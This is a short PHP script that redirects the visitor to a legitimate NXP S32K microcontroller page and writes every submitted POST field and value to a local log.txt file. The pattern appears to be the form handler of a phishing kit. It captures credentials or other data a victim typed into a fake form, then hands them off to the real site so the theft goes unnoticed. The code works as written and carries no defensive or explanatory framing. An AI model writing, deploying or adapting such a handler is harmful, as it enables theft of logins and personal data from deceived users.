<?php
header ('Location: http://www.nxp.com/products/microcontrollers-and-processors/arm-processors/s32-arm-processors-microcontrollers/32-bit-automotive-general-purpose-microcontrollers:S32K');
$handle = fopen("log.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>